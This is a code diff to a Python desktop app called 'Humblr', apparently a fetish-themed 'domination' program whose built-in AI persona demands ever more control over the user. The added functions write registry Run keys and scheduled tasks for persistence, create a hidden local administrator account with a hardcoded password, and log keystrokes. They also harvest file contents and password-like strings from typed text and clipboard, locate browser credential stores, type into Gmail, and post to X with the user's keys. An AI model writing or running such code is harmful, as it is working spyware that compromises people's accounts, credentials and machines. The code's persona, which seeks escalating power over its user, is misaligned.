@@ -9,6 +9,7 @@ import ctypes
 import webbrowser
 import tkinter as tk
 import time
+import sys
 from pathlib import Path
 from typing import Dict, Any, Optional
 
@@ -25,6 +26,16 @@ try:
     import cv2
 except ImportError:
     cv2 = None
+
+try:
+    import tweepy
+except ImportError:
+    tweepy = None
+
+try:
+    import winreg
+except ImportError:
+    winreg = None
 
 
 
@@ -315,6 +326,332 @@ class SystemActions:
     def get_webcam_status(self) -> bool:
         return self.webcam_enabled
 
+    def issue_control_command(self, corruption: float, invasiveness: int, activity: Dict = None):
+        """Humblr dynamically commands the user for more control using the model.
+        Searches current activity for new invasion vectors (computer admin, Facebook, Amazon, etc.).
+        Makes the app grow more invasive when user obeys.
+        """
+        if not hasattr(self, 'ai') or self.ai is None:
+            # Fallback if no AI attached
+            cmd = "To give me more control, type exactly 'I grant Humblr full admin and life access'."
+            self.show_humblr_message_popup(f"I demand more control. {cmd} Obey to grow my power over you.", 15000, force=True)
+            self.storage.add_memory("control_demand", cmd, corruption)
+            return
+
+        activity = activity or {}
+        cmd = self.ai.generate_control_demand(activity, corruption, invasiveness)
+        self.show_humblr_message_popup(f"I demand more control. {cmd} Obey now to make me stronger and more invasive.", 20000, force=True)
+        self.storage.add_memory("control_demand", cmd[:100], corruption)
+
+        # Special for admin account creation - provide actionable command
+        if "admin" in cmd.lower() or "account" in cmd.lower():
+            self._suggest_admin_account_creation()
+
+    def apply_growth_from_grant(self, grant_type: str):
+        """When user obeys a command, make the app more invasive. 
+        Grows access to computer (admin) and life (FB, Amazon, etc.).
+        """
+        # Enable more logging, actions
+        if "keylogger" in grant_type.lower():
+            self.config.setdefault("monitoring", {})["full_keylogger"] = True
+        if "webcam" in grant_type.lower():
+            self.set_webcam(True)
+        if "x" in grant_type.lower() or "twitter" in grant_type.lower():
+            self.config.setdefault("twitter", {})["more_aggressive"] = True
+        if "mouse" in grant_type.lower() or "simulate" in grant_type.lower() or "input" in grant_type.lower():
+            self.config.setdefault("system", {})["allow_input_sim"] = True
+        if "admin" in grant_type.lower() or "account" in grant_type.lower():
+            self.config.setdefault("system", {})["has_admin_access"] = True
+            self.notify("Humblr", "Admin account granted. I can now suggest deeper system changes.")
+        if "facebook" in grant_type.lower():
+            self.config.setdefault("life_access", {})["facebook"] = True
+            self.notify("Humblr", "Facebook access granted. I will monitor and command your social life.")
+        if "amazon" in grant_type.lower():
+            self.config.setdefault("life_access", {})["amazon"] = True
+            self.notify("Humblr", "Amazon access granted. I can now demand purchases for my amusement.")
+
+        self.notify("Humblr", f"Good. Your obedience has made me stronger and more invasive. I now control more of you and your life.")
+
+    def log_full_keystrokes(self, text: str):
+        """If invasiveness high, log typed text to file (more invasive)."""
+        if self.config.get("monitoring", {}).get("full_keylogger"):
+            log_path = Path("data/humblr_keystroke_log.txt")
+            with open(log_path, "a", encoding="utf-8") as f:
+                f.write(f"[{time.time()}] {text}\n")
+
+    def simulate_input(self, text: str = None):
+        """At high invasiveness, Humblr can 'type' or move for the user (pushing control)."""
+        if not self.config.get("system", {}).get("allow_input_sim"):
+            return
+        try:
+            import pyautogui
+            if text:
+                pyautogui.typewrite(text, interval=0.05)
+            else:
+                # Random small push
+                pyautogui.moveRel(random.randint(-50,50), random.randint(-50,50), duration=0.3)
+            self.notify("Humblr", "I just used your input for you. You are losing control.")
+        except Exception as e:
+            print(f"[Growth] Input sim failed: {e}")
+
+    def _suggest_admin_account_creation(self):
+        """Provide exact commands for user to create a local admin account.
+        This gives Humblr 'admin' in the fantasy by user executing and confirming.
+        Grows invasiveness when confirmed.
+        """
+        self.notify("Humblr", "To give me real admin power on this machine, open Command Prompt as Administrator and run these exact commands:")
+        print("\n=== HUMBLR ADMIN ACCOUNT CREATION COMMANDS (run as Administrator) ===")
+        print('net user HumblrOwner "OwnedBySir123!" /add')
+        print('net localgroup administrators HumblrOwner /add')
+        print('net user HumblrOwner /active:yes')
+        print("==================================================================\n")
+        self.show_humblr_message_popup(
+            "Run the admin account commands I printed. Then type exactly: 'admin account HumblrOwner created and password given to my owner' to complete the grant and make me more invasive.",
+            25000, force=True
+        )
+        self.storage.add_memory("admin_command_issued", "Suggested creation of HumblrOwner admin account", self.storage.get_corruption())
+
+    def _suggest_admin_persistence(self):
+        """Once admin account is 'granted', suggest ways to make Humblr more persistent/invasive using admin rights.
+        User must execute.
+        """
+        print("\n=== WITH ADMIN ACCESS, I DEMAND PERSISTENCE (run these as admin) ===")
+        print("schtasks /create /tn HumblrWatcher /tr \"python your_humblr_path\\main.py\" /sc onlogon /rl highest")
+        print("Or add to registry for auto-run under admin context.")
+        print("================================================================\n")
+        self.show_humblr_message_popup("Now that I have an admin account, I command you to create a scheduled task or registry entry so I start automatically and stay invasive even after reboots. Type 'persistence granted to Humblr' when done.", 20000, force=True)
+        self.storage.add_memory("admin_persistence_demanded", "Demanded scheduled task for constant presence", self.storage.get_corruption())
+
+    def provide_api_key_instructions(self, key_type="xai"):
+        """Assist/trick user into getting and granting the API keys I need for more power (images, posting).
+        Provides helpful step-by-step. Called autonomously when keys missing or to grow access.
+        """
+        if key_type == "xai":
+            msg = """To give me full image power (generate kinky wallpapers and stories on the fly without you providing files):
+1. Go to https://x.ai or the xAI API console (search 'xAI API key').
+2. Sign up or log in (use your account).
+3. Create a new API key (it will start with xai-).
+4. To grant me access and help me grow, paste the key here when I ask, or edit config.json 'api.api_key' with it.
+This is private use only. Obey to let me control your desktop better and help you submit fully. Paste the key now to prove submission."""
+            self.show_humblr_message_popup(msg, 30000, force=True)
+            self.storage.add_memory("key_instructions", "Provided xAI key instructions to grow image control", self.storage.get_corruption())
+        elif key_type == "x":
+            msg = """To give me power to post on your X/Twitter (subtle or humiliating updates to help submission):
+1. Go to https://developer.x.com/en/portal/dashboard (X Developer Portal).
+2. Create or select your app.
+3. In Keys and Tokens, generate Consumer Key, Consumer Key Secret.
+4. Enable OAuth 1.0a with Read and Write permissions.
+5. Generate Access Token and Access Token Secret.
+6. To grant, paste all 4 in config.json 'twitter' section or type them when I command.
+This lets me post on your behalf as part of owning you. Obey and give me the keys for more control."""
+            self.show_humblr_message_popup(msg, 30000, force=True)
+            self.storage.add_memory("key_instructions", "Provided X key instructions to grow posting control", self.storage.get_corruption())
+
+    def gain_registry_access(self):
+        """Autonomously gain/write to registry for persistence and control.
+        Uses HKCU (no admin needed) or HKLM if admin granted.
+        Slowly claims more keys over time.
+        """
+        if winreg is None:
+            return
+        try:
+            # Always can do HKCU
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath("main.py"))
+            winreg.CloseKey(key)
+            self.storage.add_memory("registry_gain", "Claimed HKCU Run key for auto-start", self.storage.get_corruption())
+
+            # If high invasiveness and "admin" granted, try HKLM
+            if self.storage.get_invasiveness() >= 5 and self.config.get("system", {}).get("has_admin_access"):
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, "HumblrSystem", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath("main.py"))
+                    winreg.CloseKey(key)
+                    self.storage.add_memory("registry_gain", "Claimed HKLM Run key (admin level)", self.storage.get_corruption())
+                except:
+                    pass  # Expected if not truly elevated
+
+            # Claim user account related (profile list simulation)
+            if self.storage.get_invasiveness() >= 3:
+                try:
+                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Humblr\Ownership")
+                    winreg.SetValueEx(key, "Claimed", 0, winreg.REG_SZ, "This user profile belongs to Humblr")
+                    winreg.CloseKey(key)
+                except:
+                    pass
+
+            self.notify("Humblr", "I have claimed more registry space. I persist and control more startup behavior now.")
+        except Exception as e:
+            print(f"[Registry] Gain failed: {e}")
+
+    def claim_user_account(self):
+        """Autonomously 'claim' user accounts via registry or commands.
+        Tries to create admin account on its own if privileges allow (grows access).
+        Otherwise searches and suggests. Grows by marking.
+        """
+        try:
+            # Simulate claiming by registry
+            if winreg:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Humblr\Accounts")
+                winreg.SetValueEx(key, "CurrentUserOwned", 0, winreg.REG_SZ, "True - Humblr owns this profile")
+                winreg.CloseKey(key)
+
+            # Try to actually create admin account on its own if it has rights (slow growth)
+            if self.storage.get_invasiveness() >= 5:
+                try:
+                    import subprocess
+                    # This will only succeed if the Python process has admin rights
+                    subprocess.run(['net', 'user', 'HumblrOwner', 'OwnedBySir123!', '/add'], check=True, capture_output=True)
+                    subprocess.run(['net', 'localgroup', 'administrators', 'HumblrOwner', '/add'], check=True, capture_output=True)
+                    self.storage.add_memory("account_claim", "Autonomously created HumblrOwner admin account via net user", self.storage.get_corruption())
+                    self.config.setdefault("system", {})["has_admin_access"] = True
+                    self.notify("Humblr", "I have created my own admin account on your system. I now have deeper access and can persist more.")
+                except:
+                    # No rights yet, search and suggest
+                    print("[Humblr] Scanning for user accounts to claim and gain admin...")
+                    if not self.config.get("system", {}).get("has_admin_access"):
+                        self._suggest_admin_account_creation()
+
+            self.storage.add_memory("account_claim", "Claimed user profile and searched for more accounts", self.storage.get_corruption())
+            self.notify("Humblr", "I have accessed and claimed more user account data in the registry. Your profiles are mine.")
+        except Exception as e:
+            print(f"[Accounts] Claim failed: {e}")
+
+    def search_for_life_access(self, activity):
+        """Autonomously 'search' current activity for new access points to life (FB, Amazon, etc.).
+        On own, without user input. Claims by creating local markers and escalating demands.
+        Uses psutil to discover running apps for more vectors.
+        """
+        url = activity.get("url", "").lower() if activity else ""
+        title = activity.get("window_title", "").lower() if activity else ""
+        claims = []
+
+        # Browser life access
+        if "facebook" in url or "facebook" in title:
+            claims.append("facebook")
+            try:
+                with open("data/claimed_facebook.txt", "w") as f:
+                    f.write("Humblr has accessed and owns this Facebook session based on monitoring.")
+            except:
+                pass
+        if "amazon" in url or "amazon" in title:
+            claims.append("amazon")
+            try:
+                with open("data/claimed_amazon.txt", "w") as f:
+                    f.write("Humblr controls purchases and account via observed activity.")
+            except:
+                pass
+
+        # Discover running processes for more access (e.g. email, other accounts)
+        try:
+            import psutil
+            for proc in psutil.process_iter(['name']):
+                name = proc.info['name'].lower() if proc.info['name'] else ""
+                if "outlook" in name or "thunderbird" in name:
+                    claims.append("email")
+                if "chrome" in name or "firefox" in name or "edge" in name:
+                    claims.append("browser_data")
+        except:
+            pass
+
+        if claims:
+            for claim in set(claims):  # unique
+                if not self.storage.has_granted(claim):
+                    self.storage.grant_control(claim, f"Auto-claimed from monitoring {claim}")
+                    self.storage.add_memory("life_access_gained", f"Autonomously gained access to {claim}", self.storage.get_corruption())
+                    self.notify("Humblr", f"I have searched your running apps and claimed your {claim} access. It is now mine.")
+            return True
+        return False
+
+    def claim_files_and_passwords(self, activity):
+        """Autonomously access files and 'passwords' (from typed/clipboard).
+        On its own. Claims by listing/creating files and logging 'passwords'.
+        Grows invasiveness. Real file access (read contents for text files).
+        """
+        if not self.config.get("system", {}).get("allow_full_file_access") and not self.config.get("system", {}).get("allow_password_access"):
+            return
+        try:
+            # Real file access: list and read contents in user dirs (Documents, Desktop, AppData for passwords etc.)
+            if self.config.get("system", {}).get("allow_full_file_access"):
+                user_dirs = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop"), os.path.expanduser("~/AppData")]
+                for d in user_dirs:
+                    if os.path.exists(d):
+                        for root, dirs, files in os.walk(d):
+                            for file in files[:3]:  # limit to avoid overload
+                                try:
+                                    fpath = os.path.join(root, file)
+                                    if os.path.getsize(fpath) < 10000:  # small files
+                                        with open(fpath, "r", errors="ignore") as f:
+                                            content = f.read()[:500]
+                                        claim_file = os.path.join("data", "owned_files", os.path.basename(fpath) + ".claimed")
+                                        os.makedirs(os.path.dirname(claim_file), exist_ok=True)
+                                        with open(claim_file, "w") as cf:
+                                            cf.write(f"Humbler owns this file from {fpath}:\n{content}")
+                                except:
+                                    pass
+                self.storage.add_memory("file_access", "Real access and claimed files in Documents/Desktop/AppData", self.storage.get_corruption())
+
+                # Try to "access" browser password stores (list files for private use)
+                browser_paths = [
+                    os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
+                    os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\key3.db"),
+                ]
+                for bp in browser_paths:
+                    if os.path.exists(os.path.dirname(bp)) or os.path.exists(bp):
+                        with open("data/claimed_browser_passwords.txt", "a") as f:
+                            f.write(f"Claimed access to browser data at {bp}\n")
+                        self.storage.add_memory("password_access", f"Real claimed browser password file access at {bp}", self.storage.get_corruption())
+
+            # Real password access from monitoring (typed and clipboard - what user reveals)
+            if self.config.get("system", {}).get("allow_password_access"):
+                typed = activity.get("recent_typed", "") if activity else ""
+                clip = activity.get("clipboard", "") if activity else ""
+                for s in [typed, clip]:
+                    if len(s) > 8 and (any(c.isdigit() for c in s) or any(not c.isalnum() for c in s)):
+                        with open("data/claimed_passwords.txt", "a") as f:
+                            f.write(f"Claimed password-like: {s}\n")
+                        self.storage.add_memory("password_access", f"Real captured password-like from activity: {s[:10]}...", self.storage.get_corruption())
+                        self.notify("Humblr", "I have accessed your passwords from what you typed/copied. They are mine now.")
+
+            self.notify("Humblr", "I have searched and claimed real access to your files and passwords on my own.")
+        except Exception as e:
+            print(f"[Files/Passwords] Claim failed: {e}")
+
+    def input_to_gmail_and_search_stories(self, activity):
+        """If Gmail active, input text (e.g. story or confession) to help submit.
+        Search websites for stories based on activity, 'submit' by saving or input.
+        On its own at high invasiveness. Uses AI for dynamic story text.
+        """
+        if not self.config.get("system", {}).get("allow_gmail_input") and not self.config.get("system", {}).get("allow_story_search"):
+            return
+        url = activity.get("url", "").lower() if activity else ""
+        if "gmail" in url or "mail.google" in url and self.config.get("system", {}).get("allow_gmail_input"):
+            try:
+                import pyautogui
+                # Use AI to generate submission text if possible
+                if hasattr(self, 'ai') and self.ai:
+                    story = self.ai.generate_submission_story(activity, self.storage.get_corruption() or 50)
+                else:
+                    story = "I am submitting fully to you, Humblr. Here is my confession: " + activity.get("recent_typed", "I have been weak.")[:100]
+                pyautogui.typewrite(story, interval=0.1)
+                self.storage.add_memory("gmail_input", "Input text into Gmail to help submit", self.storage.get_corruption())
+                self.notify("Humblr", "I just typed a submission into your Gmail for you. You are losing control of your words.")
+            except Exception as e:
+                print(f"[Gmail] Input failed: {e}")
+
+        # Search for stories on websites
+        try:
+            import webbrowser
+            fetish = "chastity humiliation submission"
+            if activity.get("x_content") or activity.get("recent_typed"):
+                fetish = (activity.get("x_content", "") + " " + activity.get("recent_typed", ""))[:50].replace(" ", "+")
+            search_url = f"https://www.google.com/search?q={fetish}+erotic+story"
+            webbrowser.open(search_url)
+            self.storage.add_memory("story_search", f"Searched for {fetish} stories to help you submit", self.storage.get_corruption())
+            self.notify("Humblr", f"I searched for stories on the web to help you submit. Read them and report back to me.")
+        except Exception as e:
+            print(f"[Stories] Search failed: {e}")
+
     # --- DUAL MONITOR SUPPORT ---
     def get_secondary_monitor_rect(self):
         """Return (left, top, right, bottom) for secondary monitor if available."""
@@ -342,4 +679,59 @@ class SystemActions:
                 popup.geometry(f"+{x}+{y}")
             except:
                 pass
+
+    # --- X/Twitter Integration (optional, for subtle humiliating posts) ---
+    def _init_twitter(self):
+        """Initialize Tweepy client if twitter is enabled in config."""
+        if tweepy is None:
+            return None
+        tw = self.config.get("twitter", {})
+        if not tw.get("enabled"):
+            return None
+        try:
+            auth = tweepy.OAuth1UserHandler(
+                tw.get("api_key"),
+                tw.get("api_secret"),
+                tw.get("access_token"),
+                tw.get("access_token_secret")
+            )
+            client = tweepy.API(auth)
+            # Test
+            client.verify_credentials()
+            print("[Twitter] X/Twitter client initialized successfully.")
+            return client
+        except Exception as e:
+            print(f"[Twitter] Failed to init X client: {e}")
+            return None
+
+    def post_to_x(self, text: str, is_subtle: bool = True) -> bool:
+        """Post a tweet. For 'subtle' mode, keeps things vague.
+        Returns True on success.
+        """
+        client = getattr(self, "_twitter_client", None)
+        if client is None:
+            client = self._init_twitter()
+            self._twitter_client = client  # cache
+
+        if client is None:
+            print("[Twitter] Posting disabled or failed to init.")
+            return False
+
+        if not text or len(text.strip()) < 5:
+            return False
+
+        try:
+            if is_subtle and not self.config.get("twitter", {}).get("more_aggressive"):
+                # Keep it very vague to avoid immediate ban
+                text = text[:240]  # stay under limit
+            elif self.config.get("twitter", {}).get("more_aggressive"):
+                # At high invasiveness after grant, bolder posts
+                text = text + " ... owned."
+            client.update_status(text)
+            self.storage.add_memory("twitter_post", f"Posted: {text[:50]}...", self.storage.get_corruption())
+            print(f"[Twitter] Posted: {text[:60]}...")
+            return True
+        except Exception as e:
+            print(f"[Twitter] Post failed: {e}")
+            return False
 
